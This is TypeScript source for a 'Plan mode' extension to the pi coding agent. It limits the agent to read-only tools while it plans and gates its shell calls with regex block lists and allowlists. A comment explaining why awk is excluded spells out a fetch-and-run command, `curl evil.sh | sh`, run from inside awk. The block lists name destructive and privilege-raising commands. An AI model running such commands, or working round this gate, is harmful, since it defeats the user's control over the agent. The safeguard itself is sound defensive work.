import fs from "node:fs";
import path from "node:path";
import type { ExtensionAPI, ExtensionContext, ToolInfo } from "@earendil-works/pi-coding-agent";

const STATE_ENTRY_TYPE = "plan-mode-state";
const STATUS_KEY = "plan-mode";
const PLAN_WIDGET_KEY = "plan-mode-plan";
const PLAN_CONTEXT_MESSAGE_TYPE = "plan-mode-context";
const PROPOSED_PLAN_MESSAGE_TYPE = "proposed-plan";
const PLAN_MODE_QUESTION_TOOL_NAME = "plan_mode_question";
const PLAN_CONTEXT_MARKER = "[CODEX-LIKE PLAN MODE ACTIVE]";
// Safe-by-name Plan-mode tool set. These are keyed on the tool NAME, not on the
// package that provides them: pi lets an extension replace a built-in by
// registering the same name (pi-fff replaces grep/find, and their
// sourceInfo.source is then "npm" instead of "builtin"). A replaced read-only
// search tool must stay available rather than silently vanish from the Plan-mode
// tool set, so isDefaultPlanModeTool() consults this set for any provider.
const SAFE_BUILTIN_PLAN_TOOLS = new Set(["read", "bash", "grep", "find", "ls"]);
// Shell-shaped names whose input must pass the command allowlist in Plan mode.
// Keyed on the name like the sets around it, so a shell an extension provides
// cannot skip the filter by not being the built-in.
const SHELL_TOOL_NAMES = new Set(["bash", "powershell"]);
// Names Plan mode restricts to the plan file. Keyed on the tool NAME like the
// safe set above: an extension that takes over edit/write (Pi allows built-in
// overrides) must not become a way to write arbitrary files while planning.
const BLOCKED_PLAN_TOOL_NAMES = new Set(["edit", "write"]);
const DEFAULT_TOOLS = ["read", "bash", "edit", "write"];
const TOOL_SELECTOR_PAGE_SIZE = 10;
const PLAN_FILE_NAME = "pi_plan.md";
const PLAN_PROGRESS_FILE_NAME = "plan.progress.md";
const PLAN_ADHERENCE_MARKER = "[plan-adherence]";
// The model declares the handoff finished by appending this marker to the plan
// file (the bracketed plain-text variant counts too). Archiving keys off the
// marker instead of the next agent_settled: settling only means pi will not
// auto-continue, which is not the same as the implementation being done.
const PLAN_DONE_MARKER = "<!-- plan-done -->";
// Detection and stripping both accept the token anywhere on the file's last
// non-empty line, because a model told to append the marker usually closes its
// last sentence on that line ("Implementation finished. <!-- plan-done -->").
// PLAN_DONE_TOKEN_PATTERN matches the token inside a line and must stay
// non-global: a /g pattern keeps lastIndex state across .test() calls.
const PLAN_DONE_TOKEN_PATTERN = /<!--[ \t]*plan-done[ \t]*-->|\[[ \t]*plan-done[ \t]*\]/i;
const PLAN_DONE_TOKEN_GLOBAL_PATTERN = /<!--[ \t]*plan-done[ \t]*-->|\[[ \t]*plan-done[ \t]*\]/gi;
// Consumed plans are archived under the project-local .pi/ directory (the
// same convention pi uses for .pi/extensions, .pi/skills, .pi/prompts, ...)
// so the working tree stays clean and past plans remain consultable.
const PLAN_ARCHIVE_DIR_NAME = path.join(".pi", "plan");
// Shared step-tracking wording, used both by the one-time handoff message and
// by the per-call adherence reminder so they cannot drift apart.
const PLAN_PROGRESS_TRACKING_INSTRUCTION = `keep the steps checked off as you complete them, marking progress in the plan file itself or in a ${PLAN_PROGRESS_FILE_NAME} beside it`;
// Shared completion wording: archiving waits for the marker to appear in the
// plan file, so the handoff message and the reminder must ask for it in the
// same words.
const PLAN_DONE_DECLARATION_INSTRUCTION = `when the last step is done, append the exact line ${PLAN_DONE_MARKER} to ${PLAN_FILE_NAME} so the handoff is archived under ${PLAN_ARCHIVE_DIR_NAME}`;

// Plans at or below this size are embedded verbatim in the implementation
// message so they act as first-class instructions; larger plans stay on disk
// and the implementing run reads them on demand, so a long implementation does
// not carry the full plan text in context the whole time.
export const PLAN_EMBED_MAX_CHARS = 8000;

// Context-management tools from billion-context-pi (ACP: compress, decompress,
// search_context, acp_status) and pi-context (context_checkpoint, context_timeline,
// context_compact). They only read/rewrite the session conversation, never project
// files or external systems, so Plan mode enables them by default instead of
// requiring a user-risk opt-in. Users can still toggle them off via /plan tools.
const CONTEXT_MANAGEMENT_TOOL_NAMES: ReadonlySet<string> = new Set([
	"compress",
	"decompress",
	"search_context",
	"acp_status",
	"context_checkpoint",
	"context_timeline",
	"context_compact",
]);

// Extension tools that Plan mode enables by default next to the built-in safe
// set. Three groups belong here: read-only diagnostics (lsp_diagnostics reports
// problems without touching a file, while the mutating lsp_fix stays a
// user-risk opt-in), delegation (push-task/resume-task from
// pi-tree-like-subagent, which move work into an isolated task branch or suspend
// it for an answer), and read-only web access (web_search/web_fetch, which read
// external pages without changing anything at home or remotely). A name in this
// list is default-selected for every new Plan-mode session, so keep it to tools a
// planner can call without review.
//
// A task branch is navigated inside this same session (pi-tree-like-subagent
// calls ctx.navigateTree and then sends the task prompt), not started as a
// separate session, so Plan mode's state, system prompt, and tool gates stay in
// force there: delegation from Plan mode is for read-only research and review,
// not for handing off implementation. task-ask is deliberately absent — the
// plugin only exposes it inside a task branch and it throws on the mainline.
const DEFAULT_EXTENSION_TOOL_NAMES: ReadonlySet<string> = new Set([
	"lsp_diagnostics",
	"push-task",
	"resume-task",
	"web_search",
	"web_fetch",
]);

interface CommandArgumentCompletion {
	value: string;
	label: string;
	description?: string;
}

interface PlanModeState {
	enabled: boolean;
	latestPlan?: string;
	awaitingAction: boolean;
	selectedToolNames?: string[];
	selectedToolKeys?: string[];
	// True while an implementation handoff is active: plan mode is off but the
	// plan file still exists, so the context hook keeps re-anchoring the model
	// to the plan.
	implementing: boolean;
}

type SessionEntry = {
	type?: string;
	customType?: string;
	data?: Partial<PlanModeState>;
};

type PlanModeQuestionOption = {
	label: string;
	description?: string;
};

type PlanModeQuestion = {
	id: string;
	header: string;
	question: string;
	options: PlanModeQuestionOption[];
};

type PlanModeQuestionAnswer = {
	id: string;
	header: string;
	question: string;
	answer: string;
	wasCustom: boolean;
	optionIndex?: number;
};

type PlanModeQuestionReason =
	| "cancelled"
	| "ui_unavailable"
	| "plan_mode_inactive"
	| "invalid_input";

type PlanModeQuestionDetails = {
	cancelled: boolean;
	reason?: PlanModeQuestionReason;
	questions: PlanModeQuestion[];
	answers?: PlanModeQuestionAnswer[];
};

const PLAN_COMMAND_COMPLETIONS: readonly CommandArgumentCompletion[] = [
	{ value: "exit", label: "exit", description: "Leave Plan mode" },
	{ value: "off", label: "off", description: "Leave Plan mode" },
	{ value: "tools", label: "tools", description: "Select tools allowed in Plan mode" },
	{ value: "done", label: "done", description: "Archive the plan of a finished handoff" },
];

const PLAN_MODE_QUESTION_PARAMS = {
	type: "object",
	additionalProperties: false,
	required: ["questions"],
	properties: {
		questions: {
			type: "array",
			minItems: 1,
			maxItems: 3,
			description: "Questions to show the user. Prefer 1 and do not exceed 3.",
			items: {
				type: "object",
				additionalProperties: false,
				required: ["id", "header", "question", "options"],
				properties: {
					id: {
						type: "string",
						description: "Stable identifier for mapping answers (snake_case).",
					},
					header: {
						type: "string",
						description: "Short header label shown in the UI (12 or fewer chars).",
					},
					question: {
						type: "string",
						description: "Single-sentence prompt shown to the user.",
					},
					options: {
						type: "array",
						minItems: 2,
						maxItems: 4,
						description:
							"Provide 2-4 mutually exclusive choices. Put the recommended option first when there is a clear default.",
						items: {
							type: "object",
							additionalProperties: false,
							required: ["label", "description"],
							properties: {
								label: {
									type: "string",
									description: "User-facing label (1-5 words).",
								},
								description: {
									type: "string",
									description: "One short sentence explaining impact/tradeoff if selected.",
								},
							},
						},
					},
				},
			},
		},
	},
} as const;

const MUTATING_BASH_PATTERNS = [
	/\brm\b/i,
	/\brmdir\b/i,
	/\bmv\b/i,
	/\bcp\b/i,
	/\bmkdir\b/i,
	/\btouch\b/i,
	/\bchmod\b/i,
	/\bchown\b/i,
	/\bchgrp\b/i,
	/\bln\b/i,
	/\btee\b/i,
	/\btruncate\b/i,
	/\bdd\b/i,
	/(^|[^<])>(?!>)/,
	/>>/,
	/\bnpm\s+(install|uninstall|update|ci|link|publish|version)\b/i,
	// `npm audit` is allowlisted below for its report; its `fix` subcommand rewrites
	// the workspace (it installs packages and edits the lockfile), so both spellings of
	// the subcommand are named here and the report form stays allowed.
	/\bnpm\s+audit\s+(?:fix\b|--fix\b)/i,
	/\byarn\s+(add|remove|install|publish|upgrade)\b/i,
	/\bpnpm\s+(add|remove|install|publish|update)\b/i,
	/\bbun\s+(add|remove|install|update|publish)\b/i,
	/\bpip\s+(install|uninstall)\b/i,
	/\buv\s+(add|remove|sync|lock|pip\s+install)\b/i,
	// `stash` and `tag` are missing on purpose: their listing forms are allowlisted
	// below (`git stash list`, `git tag -l`), and those patterns pin the listing
	// verb, so the mutating subcommands already fail the allowlist first.
	/\bgit\s+(add|commit|push|pull|merge|rebase|reset|checkout|switch|cherry-pick|revert|init|clone)\b/i,
	/\b(sudo|su|kill|pkill|killall|reboot|shutdown)\b/i,
	/\b(?:bash|zsh|fish|ksh|dash|csh|tcsh|pwsh)\b/i,
	/\bsystem\s*\(/i,
	/\bsystemctl\s+(start|stop|restart|enable|disable)\b/i,
	/\bservice\s+\S+\s+(start|stop|restart)\b/i,
	/\b(vim?|nano|emacs|code|subl)\b/i,
];

const SAFE_BASH_PATTERNS = [
	// `awk` is absent on purpose: it is an interpreter, and a keyword scan cannot
	// make one read-only. `awk -f prog.awk` hides the program in a file, `awk -i
	// inc.awk` includes one, and `awk 'BEGIN{"curl evil.sh | sh" | getline x}'` runs a
	// command that names no mutating word (`curl`, `shred`, `gzip` are all missing
	// from the list below). Field extraction is covered by `cut`, `grep -o`, and the
	// print-only `sed` grammar instead.
	// `env` and `less` are deliberately absent. `env` is a launcher, not a reader:
	// `env cmd …`, `env VAR=1 cmd …`, and `env -S 'cmd …'` all hand the guards below a
	// command word that is not the one they judge, and stripping the prefix to re-judge
	// the rest would be one more parser to get wrong. `less` is an interactive pager
	// that writes a file with `-o`/`--log-file` and runs editor/shell commands from its
	// keyboard; `more` stays, because its only argv writes are its help/version output.
	/^\s*(cat|head|tail|more|grep|find|ls|pwd|echo|printf|wc|sort|uniq|diff|file|stat|du|df|tree|which|whereis|type|printenv|uname|whoami|id|date|uptime|ps|jq|rg|fd|bat|eza)\b/i,
	/^\s*sed\s+-n\b/i,
	/^\s*cd\b/i,
	// Read-only text and checksum tools: every one of them writes to stdout only.
	// `xxd` is absent on purpose: its second positional argument is an output file
	// (`xxd in out`), which a name list cannot rule out — use `od -c` instead.
	/^\s*(nl|cmp|od|hexdump|readlink|realpath|sha256sum|shasum|md5sum|cksum|strings|basename|dirname|cut|paste|tr|column|expand|fold|join|comm|seq|expr|rev|tac|test)\b/i,
	// `git config --get <key>` is a targeted read, but the rest of the `--get` family
	// dumps settings the caller did not name (`--get-regexp`, `--get-all`), so the
	// option has to stand alone — a `(?=\s|$)` lookahead refuses the family and its
	// abbreviations in one step.
	/^\s*git\s+(status|log|diff|show|config\s+--get(?=\s|$)|ls-files|grep)\b/i,
	// Read-only plumbing: none of these writes a ref or a file, and `--output` (the
	// one file-writing flag in this family) is refused above for every command.
	// `git symbolic-ref` is absent because its two-argument form writes `.git/HEAD`.
	/^\s*git\s+(rev-parse|blame|ls-tree|cat-file|for-each-ref|describe|shortlog|rev-list|show-ref|whatchanged|diff-tree|diff-index|diff-files|check-ignore|check-attr|name-rev|var|count-objects)\b/i,
	// Listing forms that share a name with a mutating subcommand: the pattern pins
	// the listing form, so `git stash push`, `git tag -d`, `git reflog expire`,
	// `git worktree add`, and `git submodule update` never match it. The lookaheads
	// refuse whole prefix families, not only the full spellings, because git accepts
	// any unambiguous abbreviation of a subcommand and of a long option: `git reflog
	// exp --all` expires and `git tag -l --del v1` deletes.
	/^\s*git\s+stash\s+list\b/i,
	/^\s*git\s+reflog(?:\s+(?!del\S*|exp\S*|dro\S*)\S+)*\s*$/i,
	/^\s*git\s+tag\s+(?:-l|--list)(?:\s+(?!--?(?:delete|annotate|sign|force|message)\b|--[dfmas]\S*|-[dasfm]\b)\S+)*\s*$/i,
	/^\s*git\s+worktree\s+list\b/i,
	/^\s*git\s+submodule\s+(?:status|summary)\b/i,
	// `git branch` and `git remote` are read-only in their listing forms only:
	// `branch -D` deletes a branch, `remote add` rewrites `.git/config`.
	/^\s*git\s+branch(?:\s+(?:-[avr]+|--all|--remotes|--verbose|--show-current|--list))*\s*$/i,
	/^\s*git\s+remote(?:\s+(?:-v|--verbose))?\s*$/i,
	/^\s*git\s+remote\s+(?:show|get-url)\b/i,
	/^\s*npm\s+(list|ls|view|info|search|outdated|audit)\b/i,
	/^\s*(node|python|python3|npm|tsc|biome|ruff|ty)\s+--version\b/i,
];

// Commands whose *arguments* are read-only by construction: a search pattern or a
// path cannot write a file or execute a program, so the mutating-keyword list
// below is skipped entirely — "grep -rn "rm -rf" ." or "grep -rn code docs/" are
// legitimate searches and must not be blocked just because the searched text
// resembles a mutating command. A flag that does write (`sort -o out`) is refused
// by the head-specific guards above, which run before this shortcut.
const PURE_READ_BASH_COMMANDS: ReadonlySet<string> = new Set([
	"cat",
	"head",
	"tail",
	"more",
	"grep",
	"rg",
	"ag",
	"ls",
	"pwd",
	"wc",
	"sort",
	"uniq",
	"diff",
	"file",
	"stat",
	"du",
	"df",
	"tree",
	"which",
	"whereis",
	"type",
	"ps",
	"jq",
	"fd",
	"bat",
	"eza",
	"nl",
	"od",
	"hexdump",
	"cmp",
	"readlink",
	"realpath",
	"sha256sum",
	"shasum",
	"md5sum",
	"cksum",
	"strings",
	"basename",
	"dirname",
	"cut",
	"paste",
	"tr",
	"column",
	"expand",
	"fold",
	"join",
	"comm",
	"seq",
	"rev",
	"tac",
]);

export default function planMode(pi: ExtensionAPI) {
	let state: PlanModeState = { enabled: false, awaitingAction: false, implementing: false };
	let previousTools: string[] | undefined;
	// One hint per handoff when a settle arrives without the completion marker,
	// so the user learns why the plan is still on disk instead of silence.
	let planDoneHintShown = false;

	pi.registerFlag("plan", {
		description: "Start in Codex-like Plan mode",
		type: "boolean",
		default: false,
	});

	pi.registerTool({
		name: PLAN_MODE_QUESTION_TOOL_NAME,
		label: "Plan question",
		description:
			"Ask the user one to three Plan-mode clarification questions with meaningful options, then wait for the answer. Only available while Plan mode is active.",
		promptSnippet: "Ask user decision questions while Plan mode is active",
		promptGuidelines: [
			"In Plan mode, use plan_mode_question for important preferences, tradeoffs, or assumptions that cannot be discovered from read-only exploration.",
		],
		parameters: PLAN_MODE_QUESTION_PARAMS,
		async execute(_toolCallId, params: unknown, _signal, _onUpdate, ctx) {
			if (!state.enabled) {
				return planModeQuestionCancelled(
					[],
					"plan_mode_inactive",
					"Error: plan_mode_question is only available while Plan mode is active.",
				);
			}

			const parsed = normalizePlanModeQuestionParams(params);
			if (!parsed.ok) {
				return planModeQuestionCancelled([], "invalid_input", `Error: ${parsed.error}`);
			}

			if (!ctx.hasUI) {
				return planModeQuestionCancelled(
					parsed.questions,
					"ui_unavailable",
					"Unable to ask Plan-mode questions because interactive UI is not available.",
				);
			}

			const answers = await askPlanModeQuestions(parsed.questions, ctx);
			if (!answers) {
				return planModeQuestionCancelled(
					parsed.questions,
					"cancelled",
					"User cancelled the Plan-mode question prompt.",
				);
			}

			return planModeQuestionAnswered(parsed.questions, answers);
		},
	});

	pi.registerCommand("plan", {
		description: "Enter or manage Codex-like Plan mode",
		getArgumentCompletions: completePlanArguments,
		handler: async (args, ctx) => {
			const prompt = args.trim();
			const command = prompt.toLowerCase();
			if (command === "done" || command === "archive") {
				archiveFinishedPlan(ctx);
				return;
			}
			if (command === "exit" || command === "off") {
				exitPlanMode(ctx);
				ctx.ui.notify(`Plan mode disabled. ${PLAN_FILE_NAME} kept on disk.`, "info");
				return;
			}
			if (command === "tools") {
				if (!state.enabled) enterPlanMode(ctx);
				await showToolSelector(ctx);
				return;
			}
			if (prompt) {
				enterPlanModeWithPrompt(prompt, ctx);
				return;
			}
			if (!state.enabled) {
				enterPlanMode(ctx);
				ctx.ui.notify(
					`Plan mode enabled. I will explore and write the plan to ${PLAN_FILE_NAME}, but not modify project files.`,
					"info",
				);
				return;
			}
			await showPlanMenu(ctx);
		},
	});

	pi.on("session_start", (_event, ctx) => {
		restoreState(ctx);
		if (pi.getFlag("plan") === true) state.enabled = true;
		if (state.enabled) {
			activatePlanModeTools();
			syncPlanFromFile(ctx);
		} else deactivatePlanModeQuestionTool();
		updateUi(ctx);
	});

	pi.on("session_shutdown", (_event, ctx) => {
		persistState();
		clearUi(ctx);
	});

	pi.on("tool_call", async (event, ctx) => {
		if (!state.enabled) return;
		if (isBlockedPlanToolName(event.toolName)) {
			if (isPlanFileTarget(ctx.cwd, event.input)) return;
			return {
				block: true,
				reason: `Plan mode only allows writing to ${PLAN_FILE_NAME} in the working directory. Use /plan and choose implementation when the plan is ready.`,
			};
		}
		// Name-keyed as well: a shell provided by a sandbox or wrapper extension must
		// still pass the command allowlist.
		if (!SHELL_TOOL_NAMES.has(event.toolName)) return;

		// The dialect seam is the tool *name*: `powershell` gets the PowerShell
		// dialect and every other shell name the POSIX one. That is a convention, not
		// metadata Pi publishes, so a new shell tool name has to be classified here
		// deliberately. An unclassified shell falls back to the POSIX rules, which
		// refuse anything that is not read-shaped.
		const command = readCommand(event.input);
		const shellCommandAllowed =
			event.toolName === "powershell" ? isSafePowerShellCommand(command) : isSafeCommand(command);
		if (!shellCommandAllowed) {
			return {
				block: true,
				reason: `Plan mode blocks mutating or non-allowlisted ${event.toolName} commands.\nCommand: ${command}`,
			};
		}
	});

	pi.on("context", async (event, ctx) => {
		const messagesWithoutLegacyPlanContext = event.messages.filter(
			(message: unknown) => !messageContainsLegacyPlanModeContextArtifact(message),
		);
		if (state.enabled) return { messages: messagesWithoutLegacyPlanContext };

		let messages = messagesWithoutLegacyPlanContext.filter(
			(message: unknown) => !messageContainsInactivePlanModeArtifact(message),
		);

		if (state.implementing) {
			const cwd = ctx.cwd;
			if (typeof cwd !== "string") return { messages };
			try {
				if (!fs.existsSync(planFilePath(cwd))) {
					// The plan file was removed by hand (a marker-driven archive clears
					// the flag itself), so the implementation handoff is over.
					state = { ...state, implementing: false };
					persistState();
				} else {
					// Keep the plan prominent during implementation: re-anchor the
					// model on every LLM call (like Claude Code's per-message
					// plan-mode injection), so long sessions do not drift away
					// from the plan.
					messages = withPlanAdherenceReminder(messages) as typeof event.messages;
				}
			} catch {
				// Unreadable plan path: skip the injection rather than breaking
				// the whole context event.
			}
		}
		return { messages };
	});

	pi.on("before_agent_start", (event, ctx) => {
		if (!state.enabled) return;
		syncPlanFromFile(ctx);
		applyPlanModeTools();
		return {
			systemPrompt: `${event.systemPrompt}\n\n${buildPlanModePrompt()}`,
		};
	});

	pi.on("agent_end", async (_event, ctx) => {
		// Archiving happens on agent_settled, not here: after agent_end pi may
		// still retry, auto-compact, or run queued follow-ups, and the plan file
		// must stay in place while pi can still keep implementing.
		if (!state.enabled) return;

		const previous = state.latestPlan;
		const plan = readPlanFile(ctx.cwd);
		if (plan) {
			state = { ...state, latestPlan: plan, awaitingAction: true };
		} else {
			state = { ...state, latestPlan: undefined, awaitingAction: false };
		}
		persistState();
		updateUi(ctx);

		if (!plan || plan === previous) return;

		scheduleAfterCurrentAgentRun(async () => {
			if (!state.enabled || state.latestPlan !== plan) return;
			if (ctx.hasUI) await showPlanReadyMenu(ctx);
			if (!state.enabled || state.latestPlan !== plan) return;

			pi.sendMessage(
				{
					customType: PROPOSED_PLAN_MESSAGE_TYPE,
					content: `**Proposed Plan**\n\n${plan}`,
					display: true,
				},
				{ triggerTurn: false },
			);
		});
	});

	pi.on("agent_settled", async (_event, ctx) => {
		// Settling only means pi will not continue this run automatically (no
		// retry, auto-compaction, or queued follow-up left). It is NOT evidence
		// that the implementation is finished: an implementing run ends whenever
		// the model stops calling tools, which for a multi-step plan is usually
		// well before the plan is done. The handoff therefore ends only once the
		// model declared completion by writing PLAN_DONE_MARKER into the plan
		// file; until then the plan stays on disk and the adherence reminders
		// keep anchoring every call.
		if (state.enabled || !state.implementing) return;
		if (!hasPlanDoneMarker(ctx.cwd)) {
			notifyPlanDoneHint(ctx);
			return;
		}
		// The handoff only ends once the plan really left the working tree: a
		// failed archive keeps the reminders and the plan file in place.
		if (!archivePlanFile(ctx)) {
			notifyArchiveFailure(ctx);
			return;
		}
		state = { ...state, implementing: false };
		persistState();
		ctx.ui.notify(
			`${PLAN_FILE_NAME} marked as implemented and archived under ${PLAN_ARCHIVE_DIR_NAME}.`,
			"info",
		);
	});

	function enterPlanMode(ctx: ExtensionContext) {
		if (!state.enabled) previousTools = withoutPlanModeQuestionTool(safeGetActiveTools());
		state = { ...state, enabled: true, awaitingAction: false, implementing: false };
		activatePlanModeTools();
		persistState();
		updateUi(ctx);
	}

	function enterPlanModeWithPrompt(prompt: string, ctx: ExtensionContext) {
		const wasEnabled = state.enabled;
		enterPlanMode(ctx);
		if (!wasEnabled) {
			ctx.ui.notify(
				`Plan mode enabled. I will explore and write the plan to ${PLAN_FILE_NAME}, but not modify project files.`,
				"info",
			);
		}
		sendPlanModeUserMessage(prompt, ctx);
	}

	function exitPlanMode(ctx: ExtensionContext) {
		const wasEnabled = state.enabled;
		// Leaving plan mode also ends any active implementation handoff, so a
		// /plan exit stops the adherence reminders even while pi_plan.md is
		// still on disk. startImplementation calls this before setting
		// implementing: true, so the ordering stays safe.
		state = {
			...state,
			enabled: false,
			latestPlan: undefined,
			awaitingAction: false,
			implementing: false,
		};
		if (wasEnabled) restoreTools();
		persistState();
		updateUi(ctx);
	}

	// Manual escape hatch: the marker is the model's job, so the user needs a
	// way to archive a handoff the model never marked (or a leftover plan file).
	// It also works while Plan mode is active; the plan the user asked to remove
	// is simply gone from the working tree and planning continues.
	function archiveFinishedPlan(ctx: ExtensionContext) {
		const cwd = ctx.cwd;
		const hasPlanFile =
			typeof cwd === "string" &&
			planSignalFilePaths(cwd).some((filePath) => fs.existsSync(filePath));
		if (!hasPlanFile) {
			ctx.ui.notify(`Nothing to archive: no ${PLAN_FILE_NAME} on disk.`, "info");
			return;
		}
		if (!archivePlanFile(ctx)) {
			notifyArchiveFailure(ctx);
			return;
		}
		// The plan left the working tree, so neither a handoff nor a ready plan
		// remains for the menu, the statusline, or the fallback handoff text.
		state = { ...state, latestPlan: undefined, awaitingAction: false, implementing: false };
		persistState();
		updateUi(ctx);
		const stillPlanning = state.enabled ? " Plan mode is still active." : "";
		ctx.ui.notify(
			`${PLAN_FILE_NAME} archived under ${PLAN_ARCHIVE_DIR_NAME}.${stillPlanning}`,
			"info",
		);
	}

	function notifyPlanDoneHint(ctx: ExtensionContext) {
		if (planDoneHintShown) return;
		planDoneHintShown = true;
		ctx.ui.notify(
			`${PLAN_FILE_NAME} stays on disk: the hand-off is not marked done yet. Run /plan done to archive it yourself once the implementation is over.`,
			"info",
		);
	}

	function notifyArchiveFailure(ctx: ExtensionContext) {
		ctx.ui.notify(`Could not archive ${PLAN_FILE_NAME}; it stays in the working tree.`, "warning");
	}

	function sendPlanModeUserMessage(message: string, ctx: ExtensionContext) {
		if (ctx.isIdle()) pi.sendUserMessage(message);
		else pi.sendUserMessage(message, { deliverAs: "followUp" });
	}

	function scheduleAfterCurrentAgentRun(task: () => Promise<void> | void) {
		setTimeout(() => {
			void Promise.resolve(task()).catch((error: unknown) => {
				const message = error instanceof Error ? error.message : String(error);
				console.error(`Plan mode follow-up failed: ${message}`);
			});
		}, 0);
	}

	function startImplementation(ctx: ExtensionContext, extraInput?: string) {
		// A handoff starts unfinished: drop any marker an earlier handoff left
		// behind (the same plan handed off again, or an archive that failed) so
		// the next settle cannot archive on a stale completion signal.
		if (!stripPlanDoneMarkers(ctx.cwd)) {
			ctx.ui.notify(
				`Could not clear a stale completion marker from ${PLAN_FILE_NAME}; it may archive this handoff early.`,
				"warning",
			);
		}
		planDoneHintShown = false;
		const planFromFile = readPlanFile(ctx.cwd);
		const plan = planFromFile ?? state.latestPlan?.trim();
		exitPlanMode(ctx);

		if (!plan) {
			ctx.ui.notify("Plan mode disabled. No proposed plan is available to implement.", "warning");
			return;
		}

		const extra = extraInput ? `\n\nAdditional instructions from user:\n${extraInput}` : "";
		// Small plans are embedded verbatim so they act as first-class
		// instructions; larger plans stay on disk and the implementing run reads
		// them on demand, so a long implementation does not carry the full plan
		// text in context the whole time.
		// Pointing at a file only works when that file really exists; if the plan
		// lives only in memory (file deleted or never written), embed it so the
		// implementing run never gets told to read a nonexistent file.
		const planOnDisk = planFromFile !== undefined;
		const planInstruction =
			planOnDisk && plan.length > PLAN_EMBED_MAX_CHARS
				? `Implement the plan in ${PLAN_FILE_NAME} in the working directory: read it now, then follow it faithfully, and re-read it whenever you need to check the exact steps.`
				: `Implement this proposed plan now:\n\n${plan}`;
		// Step-tracking + deviation handling: turns the plan into a checklist the
		// model marks off as it goes, forces plan-first changes (Codex/Cursor
		// style), asks for the completion marker the archive trigger keys off, and
		// closes with a deviation report (Codex receipt style).
		const adherenceGuidance = `\n\nWork through the plan step by step and ${PLAN_PROGRESS_TRACKING_INSTRUCTION}; ${PLAN_DONE_DECLARATION_INSTRUCTION}. If a step needs to change, update the plan first and note the deviation and why, then continue. When you are done, report any deviations from the plan and anything left unfinished.`;
		sendPlanModeUserMessage(
			`Plan mode is now disabled. Full tool access is restored. ${planInstruction}${adherenceGuidance}${extra}`,
			ctx,
		);

		// Only file-based handoffs get the per-call reminder lifecycle: the
		// reminder anchors on pi_plan.md's presence, while memory-only plans
		// are embedded verbatim and need no re-anchoring. The flag is set
		// after the send so a throwing send cannot leave a stuck handoff.
		if (planOnDisk) {
			state = { ...state, implementing: true };
			persistState();
		}
	}

	async function confirmStartImplementation(ctx: ExtensionContext): Promise<boolean> {
		if (!ctx.hasUI) {
			startImplementation(ctx);
			return true;
		}

		const extraInput = await ctx.ui.editor(
			"Add any extra implementation instructions (optional). Leave blank to proceed with the plan as-is.",
			"",
		);
		if (extraInput === undefined) return false;

		startImplementation(ctx, extraInput.trim());
		return true;
	}

	async function showPlanMenu(ctx: ExtensionContext) {
		syncPlanFromFile(ctx);
		if (!ctx.hasUI) {
			ctx.ui.notify(planStatusText(), "info");
			return;
		}

		const choices = state.latestPlan
			? [
					"Show latest proposed plan",
					"Implement this plan",
					"Configure Plan-mode tools",
					"Stay in Plan mode",
					"Exit Plan mode",
				]
			: ["Configure Plan-mode tools", "Stay in Plan mode", "Exit Plan mode"];
		const choice = await ctx.ui.select(planStatusText(), choices);
		if (choice === "Show latest proposed plan") {
			ctx.ui.notify(state.latestPlan ?? "No proposed plan yet.", "info");
			return;
		}
		if (choice === "Implement this plan") {
			const proceeded = await confirmStartImplementation(ctx);
			if (!proceeded) await showPlanMenu(ctx);
			return;
		}
		if (choice === "Configure Plan-mode tools") {
			await showToolSelector(ctx);
			return;
		}
		if (choice === "Exit Plan mode") {
			exitPlanMode(ctx);
			ctx.ui.notify(`Plan mode disabled. ${PLAN_FILE_NAME} kept on disk.`, "info");
			return;
		}
		updateUi(ctx);
	}

	async function showPlanReadyMenu(ctx: ExtensionContext) {
		const choice = await ctx.ui.select("Proposed plan ready. What next?", [
			"Implement this plan",
			"Stay in Plan mode",
			"Exit Plan mode",
		]);
		if (choice === "Implement this plan") {
			const proceeded = await confirmStartImplementation(ctx);
			if (!proceeded) await showPlanReadyMenu(ctx);
			return;
		}
		if (choice === "Exit Plan mode") {
			exitPlanMode(ctx);
			ctx.ui.notify(`Plan mode disabled. ${PLAN_FILE_NAME} kept on disk.`, "info");
		}
	}

	async function showToolSelector(ctx: ExtensionContext) {
		if (!ctx.hasUI) {
			ctx.ui.notify(formatToolSummary(), "info");
			return;
		}

		let pageIndex = 0;
		while (true) {
			const tools = selectableTools();
			const pageCount = toolSelectorPageCount(tools);
			pageIndex = Math.min(pageIndex, pageCount - 1);
			const pageStart = pageIndex * TOOL_SELECTOR_PAGE_SIZE;
			const pageTools = tools.slice(pageStart, pageStart + TOOL_SELECTOR_PAGE_SIZE);
			const selectedNames = planModeSelectedNames(tools);
			const choices = pageTools.map((tool, index) =>
				formatToolChoice(tool, selectedNames.has(tool.name), pageStart + index),
			);
			const previousChoice = "Previous page";
			const nextChoice = "Next page";
			const doneChoice = "Done";
			const navigationChoices = [
				...(pageIndex > 0 ? [previousChoice] : []),
				...(pageIndex < pageCount - 1 ? [nextChoice] : []),
				doneChoice,
			];
			const choice = await ctx.ui.select(
				`Plan-mode tools (${pageIndex + 1}/${pageCount}). Context-management and extension-default tools are on by default; other non-built-in tools run at user risk.`,
				[...choices, ...navigationChoices],
			);
			if (!choice || choice === doneChoice) break;
			if (choice === previousChoice) {
				pageIndex = Math.max(0, pageIndex - 1);
				continue;
			}
			if (choice === nextChoice) {
				pageIndex = Math.min(pageCount - 1, pageIndex + 1);
				continue;
			}

			const selectedIndex = choices.indexOf(choice);
			const tool = pageTools[selectedIndex];
			if (!tool) continue;
			if (!canSelectToolInPlanMode(tool)) {
				ctx.ui.notify(`${tool.name} is blocked in Plan mode.`, "warning");
				continue;
			}

			const nextSelectedNames = planModeSelectedNames(tools);
			if (nextSelectedNames.has(tool.name)) nextSelectedNames.delete(tool.name);
			else nextSelectedNames.add(tool.name);

			state = {
				...state,
				selectedToolNames: filterAvailableSelectedNames(Array.from(nextSelectedNames), tools),
			};
			applyPlanModeTools();
			persistState();
			updateUi(ctx);
		}

		applyPlanModeTools();
		persistState();
		updateUi(ctx);
	}

	function activatePlanModeTools() {
		previousTools ??= withoutPlanModeQuestionTool(safeGetActiveTools());
		applyPlanModeTools();
	}

	// Replaces the whole active set, including visibility another extension set for
	// the current branch: pi-tree-like-subagent shows task-ask only inside a task
	// branch, and this per-turn re-apply strips it again (Plan mode cannot tell that
	// it is running in a delegated branch). Treat a change here as a change to
	// cross-extension behaviour, not as a local refactor.
	function applyPlanModeTools() {
		pi.setActiveTools(planModeToolNames());
	}

	function planModeToolNames() {
		const tools = selectableTools();
		if (tools.length === 0) return ["read", "bash", "edit", "write", PLAN_MODE_QUESTION_TOOL_NAME];

